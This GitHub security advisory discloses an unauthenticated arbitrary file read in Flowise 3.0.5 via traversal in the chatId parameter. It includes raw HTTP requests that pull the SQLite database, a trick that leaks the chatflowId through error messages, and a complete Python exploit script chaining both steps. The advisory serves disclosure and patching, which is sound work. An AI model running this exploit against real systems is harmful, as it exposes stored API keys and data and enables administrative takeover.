# [C] Flowise has an Arbitrary File Read

## Summary
Severity: Critical
Advisory: GHSA-99pg-hqvx-r4gf
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H (CVSS_V3)
Published: 2025-09-15
Source: https://github.com/advisories/GHSA-99pg-hqvx-r4gf
Type: github-advisory

## Affected
- npm: `flowise` — affected >=3.0.5 <3.0.6

## Details
### Summary
An arbitrary file read vulnerability in the `chatId` parameter supplied to both the `/api/v1/get-upload-file` and `/api/v1/openai-assistants-file/download` endpoints allows unauthenticated users to read unintended files on the local filesystem. In the default Flowise configuration this allows reading of the local sqlite db and subsequent compromise of all database content.

### Details
Both the `/api/v1/get-upload-file` and `/api/v1/openai-assistants-file/download` endpoints accept the `chatId` parameter and pass this to a subsequent call to streamStorageFile().


```
const chatflowId = req.query.chatflowId as string
const chatId = req.query.chatId as string
const fileName = req.query.fileName as string

...
 const fileStream = await streamStorageFile(chatflowId, chatId, fileName, orgId)
```

While streamStorageFile validates that the chatflowId is a UUID and strips traversal sequences from fileName, it performs no validation of chatId.


```
    // Validate chatflowId
    if (!chatflowId || !isValidUUID(chatflowId)) {
        throw new Error('Invalid chatflowId format - must be a valid UUID')
    }

    // Check for path traversal attempts
    if (isPathTraversal(chatflowId)) {
        throw new Error('Invalid path characters detected in chatflowId')
    }
...
    const sanitizedFilename = sanitize(fileName)
...
	const filePath = path.join(getStoragePath(), orgId, chatflowId, chatId, sanitizedFilename)
```

There is validation that the resulting filePath is restricted to the `/root/.flowise/storage` directory.

```
if (!filePath.startsWith(getStoragePath())) throw new Error(`Invalid file path`)
```

However, if the file is not found in the specified path, the orgId value is removed from the filePath and reattempted.

```
        if (fs.existsSync(filePath)) {
            return fs.createReadStream(filePath)
        } else {
            // Fallback: Check if file exists without orgId
            const fallbackPath = path.join(getStoragePath(), chatflowId, chatId, sanitizedFilename)

            if (fs.existsSync(fallbackPath)) {
                // Create directory if it doesn't exist
                const dir = path.dirname(filePath)
                if (!fs.existsSync(dir)) {
                    fs.mkdirSync(dir, { recursive: true })
                }

                // Copy file to correct location with orgId
                fs.copyFileSync(fallbackPath, filePath)

                // Delete the old file
                fs.unlinkSync(fallbackPath)

                // Clean up empty directories recursively
                _cleanEmptyLocalFolders(path.join(getStoragePath(), chatflowId, chatId))

                return fs.createReadStream(filePath)

```

As this fallback path is read after the `/root/.flowise/storage` check, this allows an additional level of traversal up to `/root/.flowise/`. As a result, this  allows reading of `/root/.flowise/database.sqlite`, which contains all database content in the default Flowise configuration.

REQUEST
```
GET /api/v1/get-upload-file?chatflowId=188903b1-d06d-4f93-9415-400015b87146&chatId=../.././&fileName=database.sqlite HTTP/1.1
Host: 127.0.0.1:3000

```

RESPONSE
```
HTTP/1.1 200 OK
Vary: Origin
Access-Control-Allow-Credentials: true
Content-Disposition: attachment; filename="database.sqlite"
Date: Tue, 22 Jul 2025 06:43:51 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 385024

SQLite format 3���@  ���6���^���A������Õ�������������������������������������������������6�.r¢ö�Ú����ZûìñæàÚÛ	�Ïl
ÍS=*''���������������������������������������������������������������������������������������������������������������������������������������������;,O)�indexsqlite_autoindex_docume
...
```

Similarly, for `/api/v1/openai-assistants-file/download`:
REQUEST
```
POST /api/v1/openai-assistants-file/download HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Content-Length: 100

{"chatflowId":"c5c63474-e757-4fca-a504-d54e84c309bb","chatId":"/../..","fileName":"database.sqlite"}
```
RESPONSE
```
HTTP/1.1 200 OK
Vary: Origin
Access-Control-Allow-Credentials: true
Content-Disposition: attachment; filename="database.sqlite"
Date: Tue, 22 Jul 2025 08:55:25 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 385024

SQLite format 3���@  ���6���^���A������Õ�������������������������������������������������6�.r¢ö�Ú����ZûìñæàÚÛ	
...
```

This includes all API keys used by the application (apiKey table), which can be used to gain administrative access.

As the fallback logic attempts to move the file to the initially checked directory, this results in the server permanently being unable to make new read or write operations until the file is moved and the server is restarted.

Interaction with these endpoints requires knowledge of a valid `chatflowId`. As a UUID, this is inherently unguessable. However, the `/api/v1/vector/upsert/` endpoint can be used without a chatflowId, defaulting to the first ID available. This endpoint returns a verbose error when receiving a malformed filename, revealing the full internal file path and the associated `chatflowId`.


REQUEST
```
POST /api/v1/vector/upsert/ HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 172
Connection: keep-alive

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="files"; filename="?"
Content-Type: text/plain


------WebKitFormBoundary7MA4YWxkTrZu0gW--
```
RESPONSE
```
HTTP/1.1 500 Internal Server Error
Vary: Origin
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Content-Length: 240
ETag: W/"f0-khSyqlT3NYLMJGjdchTl6Iwqe4U"
Date: Tue, 22 Jul 2025 08:14:20 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"statusCode":500,"success":false,"message":"Error: vectorsService.upsertVector - EISDIR: illegal operation on a directory, open '/root/.flowise/storage/07b5d2bd-9b5c-4de3-b234-4fe4357051c9/188903b1-d06d-4f93-9415-400015b87146'","stack":{}}
```
In this case the UUID is revealed as `188903b1-d06d-4f93-9415-400015b87146`, which can then be used to exploit the file read vulnerability.

### PoC

Run Flowise:
```
docker run --rm  -p 3000:3000 flowiseai/flowise
```
Complete install & create a Chatflow:
<img width="575" height="299" alt="image" src="https://github.com/user-attachments/assets/1a34e809-b9b3-48a1-93b4-8dafccf87e3b" />

Save this script to `read.py`:
```
import argparse
import re
import requests

def read_file(url, file_path, proxy):
    base_url = url
    proxies = {'http': proxy, 'https': proxy} if proxy else None

    print(f">> starting exploit against {base_url}")
    if proxy:
        print(f">> using proxy: {proxy}")

    try:
        print("[*] step 1: leaking chatflowid")
        initial_headers = {}
        files = {'files': ('?', 'asdf', 'text/plain')}
        response = requests.post(f"{base_url}/api/v1/vector/upsert/", files=files, headers=initial_headers, timeout=10, proxies=proxies)
        chatflow_id_matches = re.findall(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', response.json().get("message", ""))
        if len(chatflow_id_matches) < 2:
            print("[-] failed to leak chatflowid.")
            return
        chatflow_id = chatflow_id_matches[1]
        print(f"[+] got chatflowid: {chatflow_id}")

        print(f"[*] step 2: reading file: {file_path}")
        internal_headers = {'x-request-from': 'internal'}
        params = {'chatflowId': chatflow_id, 'chatId': '/../../', 'fileName': file_path}
        response = requests.get(f"{base_url}/api/v1/get-upload-file", params=params, headers=internal_headers, timeout=10, proxies=proxies)
        
        if response.status_code != 200:
            print(f"[-] failed to read file (status: {response.status_code}).")
            print(response.text)
            return
        
        file_content = response.text
        print(f"[+] successfully read file ({len(response.content)} bytes).")
        print("\n--- file content ---")
        print(file_content)
        print("--------------------\n")

    except requests.exceptions.RequestException as e:
        print(f"\n[-] an unexpected error occurred: {e}")
    except Exception as e:
        print(f"\n[-] an unexpected error occurred: {e}")
        return

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Read arbitrary files")
    parser.add_argument("-u", "--url", type=str, required=True, help="target base url (e.g., http://127.0.0.1:3000)")
    parser.add_argument("-f", "--file", type=str, required=True, help="path of the file to read on the server (e.g., database.sqlite)")
    parser.add_argument("-x", "--proxy", type=str, help="proxy to use (e.g., http://127.0.0.1:8080)")

    args = parser.parse_args()
    read_file(args.url, args.file, args.proxy)
```

Run the script against `http://127.0.0.1:3000`:
```
python3 read.py -u http://127.0.0.1:3000 -f database.sqlite
>> starting exploit against http://127.0.0.1:3000
[*] step 1: leaking chatflowid
[+] got chatflowid: c5c63474-e757-4fca-a504-d54e84c309bb
[*] step 2: reading file: database.sqlite
[+] successfully read file (385024 bytes).

--- file content ---
ÕÇêS=*'';,O)indexsqlite_autoindex...

```


### Impact

This allows any unauthenticated user to extract all database content from a default installation of Flowise. This includes API keys, which can be used to gain administrative access.

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-99pg-hqvx-r4gf
- https://github.com/FlowiseAI/Flowise
